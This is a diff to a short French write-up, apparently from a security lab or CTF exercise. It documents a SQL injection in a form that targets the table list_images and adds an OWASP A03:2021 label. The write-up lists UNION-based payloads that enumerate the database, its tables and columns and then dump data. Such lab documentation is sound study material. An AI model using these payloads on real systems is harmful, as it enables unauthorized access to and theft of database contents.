@@ -4,6 +4,9 @@
 
 Injection SQL
 
+## OWASP
+**A03:2021 – Injection**
+
 ## Description
 
 Cette faille est similaire à l'injection SQL sur 'Members ID'. Elle permet également d'exécuter des requêtes SQL arbitraires via un formulaire, en accédant à des informations sensibles dans la base de données. La table ciblée est `list_images`, et l'exploitation suit le même processus que précédemment.
@@ -12,8 +15,11 @@ Cette faille est similaire à l'injection SQL sur 'Members ID'. Elle permet éga
 
 ```
 1 UNION ALL SELECT 1, DATABASE()
+
 1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
+
 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+
 1 AND 1=2 UNION SELECT {column_name}, null FROM list_images
 ```
 
